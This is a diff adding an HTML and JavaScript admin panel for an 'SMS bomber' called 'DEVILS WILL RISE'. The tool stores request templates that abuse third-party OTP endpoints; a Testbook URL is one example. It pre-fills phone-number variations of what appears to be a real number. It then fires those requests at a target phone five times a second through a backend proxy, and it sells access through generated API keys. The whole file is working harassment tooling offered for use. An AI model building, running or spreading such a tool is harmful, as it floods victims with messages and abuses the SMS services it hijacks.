@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💀 DEVILS WILL RISE — SMS BOMBER ADMIN</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header { border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
+        .header h1 { color: #ff0000; font-size: 2em; }
+        .header span { color: #888; font-size: 0.8em; }
+        .card { background: #111; border: 1px solid #333; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
+        .card h3 { color: #ff6600; margin-bottom: 10px; }
+        .row { display: flex; gap: 20px; flex-wrap: wrap; }
+        .col { flex: 1; min-width: 300px; }
+        input, textarea, select { width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid #333; color: #00ff00; border-radius: 5px; font-family: monospace; }
+        textarea { height: 200px; }
+        button { background: #00ff00; color: #000; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #00cc00; }
+        .btn-danger { background: #ff0000; color: #fff; }
+        .btn-danger:hover { background: #cc0000; }
+        .btn-warning { background: #ff6600; color: #fff; }
+        .btn-warning:hover { background: #cc5500; }
+        .status { padding: 5px 10px; border-radius: 5px; display: inline-block; }
+        .status.active { background: #00ff00; color: #000; }
+        .status.inactive { background: #ff0000; color: #fff; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
+        th { color: #ff6600; }
+        .request-item { background: #1a1a1a; padding: 15px; margin-bottom: 10px; border-radius: 5px; border-left: 4px solid #ff6600; }
+        .request-item .meta { display: flex; gap: 20px; flex-wrap: wrap; font-size: 0.9em; color: #888; }
+        .request-item .raw { background: #0a0a0a; padding: 10px; border-radius: 5px; margin-top: 10px; font-size: 0.8em; white-space: pre-wrap; word-break: break-all; max-height: 150px; overflow-y: auto; }
+        .badge { background: #333; padding: 2px 8px; border-radius: 10px; font-size: 0.7em; }
+        .badge.success { background: #00ff00; color: #000; }
+        .badge.fail { background: #ff0000; color: #fff; }
+        #log { background: #0a0a0a; padding: 10px; border-radius: 5px; height: 200px; overflow-y: auto; font-size: 0.8em; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>💀 DEVILS WILL RISE — SMS BOMBER</h1>
+        <span>Owner: @gaurav_beniwal_0001 | Channel: @gaurav_beni_0001</span>
+    </div>
+
+    <div class="row">
+        <!-- Left: Add Request -->
+        <div class="col">
+            <div class="card">
+                <h3>📥 ADD NEW REQUEST</h3>
+                <label>Request Name:</label>
+                <input type="text" id="reqName" placeholder="e.g., Testbook OTP">
+                <br><br>
+                <label>Target URL (with {phone} placeholder):</label>
+                <input type="text" id="reqUrl" placeholder="https://api.testbook.com/api/v2/otp/send?emailOrMobile={phone}&resend=true">
+                <br><br>
+                <label>Method:</label>
+                <select id="reqMethod">
+                    <option value="POST">POST</option>
+                    <option value="GET">GET</option>
+                </select>
+                <br><br>
+                <label>Headers (JSON):</label>
+                <textarea id="reqHeaders" placeholder='{"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}'></textarea>
+                <br><br>
+                <label>Body (JSON):</label>
+                <textarea id="reqBody" placeholder='{}'></textarea>
+                <br><br>
+                <label>Phone Variations (comma separated):</label>
+                <input type="text" id="reqPhones" value="9729480795,+919729480795,919729480795,09729480795">
+                <br><br>
+                <button onclick="addRequest()">➕ ADD REQUEST</button>
+            </div>
+        </div>
+
+        <!-- Right: Stats & Control -->
+        <div class="col">
+            <div class="card">
+                <h3>🎯 TARGET</h3>
+                <input type="text" id="targetPhone" placeholder="Enter phone number">
+                <br><br>
+                <button onclick="startAttack()" class="btn-warning">🚀 START BOMBING</button>
+                <button onclick="stopAttack()" class="btn-danger">⏹️ STOP</button>
+            </div>
+
+            <div class="card">
+                <h3>🔑 API KEYS</h3>
+                <input type="text" id="apiKey" placeholder="Enter API Key">
+                <br><br>
+                <label>Expiry:</label>
+                <select id="keyExpiry">
+                    <option value="3600">1 Hour</option>
+                    <option value="86400">1 Day</option>
+                    <option value="604800">1 Week</option>
+                    <option value="0">Unlimited</option>
+                </select>
+                <br><br>
+                <button onclick="generateKey()">🔑 GENERATE KEY</button>
+                <button onclick="revokeKey()" class="btn-danger">🗑️ REVOKE</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Request List -->
+    <div class="card">
+        <h3>📋 REQUEST TEMPLATES</h3>
+        <div id="requestList"></div>
+    </div>
+
+    <!-- Logs -->
+    <div class="card">
+        <h3>📜 LIVE LOGS</h3>
+        <div id="log"></div>
+    </div>
+</div>
+
+<script>
+    // ===== CONFIG =====
+    const API_BASE = window.location.origin + '/api';
+    let attackInterval = null;
+    let currentRequest = null;
+
+    // ===== LOAD REQUESTS =====
+    async function loadRequests() {
+        try {
+            const res = await fetch(API_BASE + '/requests');
+            const data = await res.json();
+            renderRequests(data);
+        } catch (e) {
+            console.error('Error loading requests:', e);
+        }
+    }
+
+    function renderRequests(requests) {
+        const container = document.getElementById('requestList');
+        if (!requests || requests.length === 0) {
+            container.innerHTML = '<p style="color: #888;">No requests configured. Add one above!</p>';
+            return;
+        }
+        container.innerHTML = requests.map((req, idx) => `
+            <div class="request-item">
+                <div style="display: flex; justify-content: space-between;">
+                    <strong>${req.name}</strong>
+                    <span>
+                        <span class="status ${req.active ? 'active' : 'inactive'}">${req.active ? 'ACTIVE' : 'INACTIVE'}</span>
+                        <button onclick="toggleRequest(${idx})" style="margin-left:10px;">${req.active ? '⏸️' : '▶️'}</button>
+                        <button onclick="deleteRequest(${idx})" class="btn-danger" style="margin-left:5px;">🗑️</button>
+                    </span>
+                </div>
+                <div class="meta">
+                    <span>Method: ${req.method}</span>
+                    <span>URL: ${req.url}</span>
+                    <span>Phone Variations: ${req.phones.join(', ')}</span>
+                </div>
+                <div class="raw"><strong>Headers:</strong> ${JSON.stringify(req.headers, null, 2)}</div>
+                <div class="raw"><strong>Body:</strong> ${req.body || '{}'}</div>
+            </div>
+        `).join('');
+    }
+
+    // ===== ADD REQUEST =====
+    async function addRequest() {
+        const name = document.getElementById('reqName').value.trim();
+        const url = document.getElementById('reqUrl').value.trim();
+        const method = document.getElementById('reqMethod').value;
+        const headers = document.getElementById('reqHeaders').value.trim();
+        const body = document.getElementById('reqBody').value.trim();
+        const phones = document.getElementById('reqPhones').value.split(',').map(p => p.trim()).filter(p => p);
+
+        if (!name || !url || !phones.length) {
+            alert('Name, URL, and at least one phone number required!');
+            return;
+        }
+
+        let headersObj = {};
+        try {
+            if (headers) headersObj = JSON.parse(headers);
+        } catch (e) {
+            alert('Invalid headers JSON!');
+            return;
+        }
+
+        const payload = { name, url, method, headers: headersObj, body: body || '{}', phones, active: true };
+
+        try {
+            const res = await fetch(API_BASE + '/requests', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const data = await res.json();
+            if (data.success) {
+                alert('✅ Request added!');
+                loadRequests();
+                clearFields();
+            } else {
+                alert('❌ Error: ' + data.message);
+            }
+        } catch (e) {
+            alert('❌ Network error: ' + e.message);
+        }
+    }
+
+    function clearFields() {
+        document.getElementById('reqName').value = '';
+        document.getElementById('reqUrl').value = '';
+        document.getElementById('reqHeaders').value = '';
+        document.getElementById('reqBody').value = '';
+    }
+
+    // ===== TOGGLE REQUEST =====
+    async function toggleRequest(idx) {
+        try {
+            const res = await fetch(API_BASE + '/requests/' + idx + '/toggle', { method: 'PUT' });
+            const data = await res.json();
+            if (data.success) loadRequests();
+        } catch (e) {
+            console.error('Toggle error:', e);
+        }
+    }
+
+    // ===== DELETE REQUEST =====
+    async function deleteRequest(idx) {
+        if (!confirm('Delete this request?')) return;
+        try {
+            const res = await fetch(API_BASE + '/requests/' + idx, { method: 'DELETE' });
+            const data = await res.json();
+            if (data.success) loadRequests();
+        } catch (e) {
+            console.error('Delete error:', e);
+        }
+    }
+
+    // ===== START ATTACK =====
+    async function startAttack() {
+        const phone = document.getElementById('targetPhone').value.trim();
+        if (!phone) {
+            alert('Enter a target phone number!');
+            return;
+        }
+
+        // Get active requests
+        const res = await fetch(API_BASE + '/requests');
+        const requests = await res.json();
+        const active = requests.filter(r => r.active);
+        if (!active.length) {
+            alert('No active requests found!');
+            return;
+        }
+
+        if (attackInterval) {
+            clearInterval(attackInterval);
+            attackInterval = null;
+        }
+
+        let index = 0;
+        const log = document.getElementById('log');
+
+        attackInterval = setInterval(async () => {
+            const req = active[index % active.length];
+            index++;
+
+            // Replace {phone} in URL
+            const url = req.url.replace(/\{phone\}/g, phone);
+
+            // Replace {phone} in body if exists
+            let body = req.body;
+            if (body && typeof body === 'string') {
+                body = body.replace(/\{phone\}/g, phone);
+            }
+
+            try {
+                const response = await fetch(API_BASE + '/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        url: url,
+                        method: req.method,
+                        headers: req.headers,
+                        body: body,
+                        phone: phone,
+                        requestName: req.name
+                    })
+                });
+                const data = await response.json();
+                const logEntry = `[${new Date().toLocaleTimeString()}] ${req.name} | ${data.status || '?'} | ${data.message || 'Done'}`;
+                log.innerHTML = logEntry + '\n' + log.innerHTML;
+                if (log.children.length > 50) log.removeChild(log.lastChild);
+            } catch (e) {
+                const logEntry = `[${new Date().toLocaleTimeString()}] ${req.name} | ERROR | ${e.message}`;
+                log.innerHTML = logEntry + '\n' + log.innerHTML;
+            }
+        }, 200); // 5 requests per second
+
+        log.innerHTML = `🚀 Attack started on ${phone} with ${active.length} requests\n` + log.innerHTML;
+    }
+
+    function stopAttack() {
+        if (attackInterval) {
+            clearInterval(attackInterval);
+            attackInterval = null;
+            document.getElementById('log').innerHTML = '⏹️ Attack stopped\n' + document.getElementById('log').innerHTML;
+        }
+    }
+
+    // ===== API KEY MANAGEMENT =====
+    async function generateKey() {
+        const expiry = parseInt(document.getElementById('keyExpiry').value);
+        try {
+            const res = await fetch(API_BASE + '/keys', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ expiry: expiry })
+            });
+            const data = await res.json();
+            if (data.success) {
+                document.getElementById('apiKey').value = data.key;
+                alert('✅ Key generated: ' + data.key);
+            } else {
+                alert('❌ Error: ' + data.message);
+            }
+        } catch (e) {
+            alert('❌ Network error: ' + e.message);
+        }
+    }
+
+    async function revokeKey() {
+        const key = document.getElementById('apiKey').value.trim();
+        if (!key) {
+            alert('Enter API key to revoke!');
+            return;
+        }
+        if (!confirm('Revoke this key?')) return;
+        try {
+            const res = await fetch(API_BASE + '/keys/' + key, { method: 'DELETE' });
+            const data = await res.json();
+            if (data.success) {
+                document.getElementById('apiKey').value = '';
+                alert('✅ Key revoked!');
+            } else {
+                alert('❌ Error: ' + data.message);
+            }
+        } catch (e) {
+            alert('❌ Network error: ' + e.message);
+        }
+    }
+
+    // ===== INIT =====
+    loadRequests();
+</script>
+</body>
+</html>
